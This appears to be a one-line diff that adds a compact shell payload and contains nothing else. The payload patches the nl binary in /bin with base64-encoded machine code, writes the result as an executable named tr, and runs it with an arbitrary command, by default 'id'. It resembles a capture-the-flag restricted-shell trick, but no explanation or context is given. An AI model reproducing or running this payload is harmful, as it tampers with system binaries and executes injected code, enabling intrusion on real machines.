@@ -1,0 +1,1 @@
+:;cd /bin;(head -c6288;read -N30;recode /64<<<SIscJQiRYABmv/7/McCwag8FsGkPBUiLfghIjYNwSAIA/+A=;cat)>tr<nl;tr "${cmd-id}"
